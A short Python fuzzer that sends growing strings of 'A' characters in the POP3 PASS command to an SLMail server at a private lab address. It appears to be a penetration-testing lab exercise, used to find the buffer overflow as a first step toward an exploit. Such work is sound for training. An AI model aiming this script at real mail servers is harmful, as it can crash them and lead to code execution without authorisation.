#!/usr/bin/python 
# SLMail fuzzer to check for buffer overflow 
import socket 

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter += 200 

for string in buffer:
	print "Fuzzing pass with %s bytes" % len(string) 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	#print "\nSending buffer.."
	connect = s.connect(('10.11.20.130',110))
	s.recv(1024)
	#print data

	s.send("USER test" + "\r\n")	
	s.recv(1024)
	#print data 

	s.send("PASS"+ string +"\r\n")
	s.recv(1024)
	#print data 

	s.send("QUIT\r\n")
	s.close()

	#print "could not connect" 


